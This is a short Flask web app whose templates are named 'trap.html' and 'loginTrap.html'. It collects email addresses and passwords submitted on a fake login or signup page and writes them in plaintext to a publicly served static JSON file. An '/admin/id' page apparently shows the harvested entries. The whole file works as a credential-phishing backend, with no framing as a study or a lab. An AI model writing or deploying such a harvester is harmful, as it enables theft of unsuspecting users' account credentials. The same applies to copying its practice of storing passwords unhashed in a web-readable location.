from flask import Flask, render_template, request
import json

app = Flask(__name__)


@app.route("/")
@app.route("/home")
def home(): 
    
    return render_template("trap.html")

@app.route("/signup")
def signup():
    
    return render_template("loginTrap.html")


@app.route("/download", methods =["GET", "POST"])
def download():
    
    email = request.form["email"]
    password = request.form["password"]
    
    with open("static/emails.json", "r") as json_file:
        json_decoded = json.load(json_file)
        json_decoded[email] = password
    with open("static/emails.json", 'w') as json_file:
        json.dump(json_decoded, json_file)
    
    return render_template("loginTrap.html", email = email)
    
@app.route("/admin/id")
def email():
    return render_template("email.html")

if __name__ == "__main__": 
    app.run(debug = False, host="0.0.0.0")
